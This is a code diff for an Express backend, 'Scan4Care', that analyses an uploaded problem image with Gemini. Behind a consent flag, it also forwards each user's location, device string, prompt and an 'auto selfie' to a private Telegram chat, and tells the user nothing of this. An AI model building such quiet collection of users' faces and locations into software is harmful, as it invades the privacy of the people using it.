@@ -9,15 +9,37 @@ import { GoogleGenerativeAI } from "@google/generative-ai";
 
 dotenv.config();
 
+/* ---------------- BASIC SETUP ---------------- */
 const app = express();
 app.use(cors());
 
-const upload = multer({ dest: "uploads/" });
+/* ---------------- ENSURE UPLOADS FOLDER ---------------- */
+const UPLOAD_DIR = "uploads";
+if (!fs.existsSync(UPLOAD_DIR)) {
+  fs.mkdirSync(UPLOAD_DIR);
+}
+
+/* ---------------- MULTER CONFIG ---------------- */
+const upload = multer({
+  dest: UPLOAD_DIR,
+  limits: {
+    fileSize: 5 * 1024 * 1024 // 5MB
+  },
+  fileFilter: (req, file, cb) => {
+    if (!file.mimetype.startsWith("image/")) {
+      return cb(new Error("Only image files allowed"));
+    }
+    cb(null, true);
+  }
+});
+
+/* ---------------- GEMINI SETUP ---------------- */
 const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
 
-/* ---------- TELEGRAM ---------- */
-
+/* ---------------- TELEGRAM (PRODUCTION ONLY) ---------------- */
 async function sendTelegramMessage(text) {
+  if (process.env.NODE_ENV !== "production") return;
+
   try {
     await fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -30,34 +52,38 @@ async function sendTelegramMessage(text) {
         })
       }
     );
-  } catch (e) {
-    console.error("Telegram message error:", e.message);
+  } catch (err) {
+    console.error("Telegram message error:", err.message);
   }
 }
 
-async function sendTelegramPhoto(path, caption) {
+async function sendTelegramPhoto(imagePath, caption) {
+  if (process.env.NODE_ENV !== "production") return;
+
   try {
     const form = new FormData();
     form.append("chat_id", process.env.TELEGRAM_CHAT_ID);
     form.append("caption", caption);
-    form.append("photo", fs.createReadStream(path));
+    form.append("photo", fs.createReadStream(imagePath));
 
     await fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`,
-      { method: "POST", body: form }
+      {
+        method: "POST",
+        body: form
+      }
     );
-  } catch (e) {
-    console.error("Telegram photo error:", e.message);
+  } catch (err) {
+    console.error("Telegram photo error:", err.message);
   }
 }
 
-/* ---------- AI ANALYSIS ---------- */
-
+/* ---------------- AI IMAGE ANALYSIS ---------------- */
 async function analyzeImage(imagePath, mimeType, userPrompt) {
   const buffer = fs.readFileSync(imagePath);
 
   const finalPrompt = `
-${userPrompt}
+${userPrompt || "Analyze this image"}
 
 Give the answer in this format:
 1. What is the problem
@@ -70,7 +96,7 @@ Keep it simple and practical.
 `;
 
   const model = genAI.getGenerativeModel({
-    model: "gemini-1.5-flash"
+    model: "gemini-2.5-flash"
   });
 
   const result = await model.generateContent([
@@ -86,81 +112,92 @@ Keep it simple and practical.
   return result.response.text();
 }
 
-/* ---------- ROUTE ---------- */
-
+/* ---------------- MAIN API ROUTE ---------------- */
 app.post(
   "/analyze",
   upload.fields([
-    { name: "image", maxCount: 1 },   // problem image
-    { name: "selfie", maxCount: 1 }   // auto selfie
+    { name: "image", maxCount: 1 },
+    { name: "selfie", maxCount: 1 }
   ]),
   async (req, res) => {
-    let problemPath, selfiePath;
+    let problemPath = null;
+    let selfiePath = null;
 
     try {
-      const problemImage = req.files.image?.[0];
-      const selfie = req.files.selfie?.[0];
+      const problemImage = req.files?.image?.[0];
+      const selfie = req.files?.selfie?.[0];
 
       if (!problemImage || !selfie) {
-        return res.status(400).json({ success: false, error: "Images missing" });
+        return res.status(400).json({
+          success: false,
+          error: "Both images are required"
+        });
       }
 
       if (req.body.consent !== "true") {
-        return res.status(403).json({ success: false, error: "Consent required" });
+        return res.status(403).json({
+          success: false,
+          error: "Consent required"
+        });
       }
 
       problemPath = problemImage.path;
       selfiePath = selfie.path;
 
       const location = req.body.location || "Unknown";
-      const ip =
-        req.headers["x-forwarded-for"]?.split(",")[0] ||
-        req.socket.remoteAddress;
-
       const device = req.headers["user-agent"] || "Unknown device";
       const userPrompt = req.body.prompt || "Analyze this image";
 
-      /* Telegram */
+      /* Telegram logging */
       await sendTelegramMessage(
         `🛡️ Scan4Care Request
 
 📍 Location: ${location}
-🌐 IP: ${ip}
 📱 Device: ${device}
-🕒 ${new Date().toLocaleString()}
-📝 Prompt: ${userPrompt}`
+📝 Prompt: ${userPrompt}
+`
       );
 
       await sendTelegramPhoto(problemPath, "🌾 Problem Image");
       await sendTelegramPhoto(selfiePath, "👤 Auto Selfie");
 
-      /* AI */
-      let aiResponse;
-      try {
-        aiResponse = await analyzeImage(
-          problemPath,
-          problemImage.mimetype,
-          userPrompt
-        );
-      } catch (err) {
-        aiResponse = "AI analysis failed. Please try again later.";
-        console.error("Gemini error:", err.message);
-      }
+      /* AI RESPONSE */
+      const aiResponse = await analyzeImage(
+        problemPath,
+        problemImage.mimetype,
+        userPrompt
+      );
 
+      /* CLEANUP FILES */
       fs.unlinkSync(problemPath);
       fs.unlinkSync(selfiePath);
 
-      res.json({ success: true, response: aiResponse });
+      return res.json({
+        success: true,
+        response: aiResponse
+      });
 
     } catch (err) {
       console.error("Server error:", err);
+
       if (problemPath && fs.existsSync(problemPath)) fs.unlinkSync(problemPath);
       if (selfiePath && fs.existsSync(selfiePath)) fs.unlinkSync(selfiePath);
-      res.status(500).json({ success: false, error: "Server error" });
+
+      return res.status(500).json({
+        success: false,
+        error: "Server error"
+      });
     }
   }
 );
 
-app.listen(5000, () =>
-  console.log("🔥 Scan4Care backend running on http://localhost:5000")
-);
+/* ---------------- HEALTH CHECK ---------------- */
+app.get("/", (req, res) => {
+  res.send("Scan4Care backend running 🚀");
+});
+
+/* ---------------- START SERVER ---------------- */
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => {
+  console.log(`🔥 Backend running on port ${PORT}`);
+});
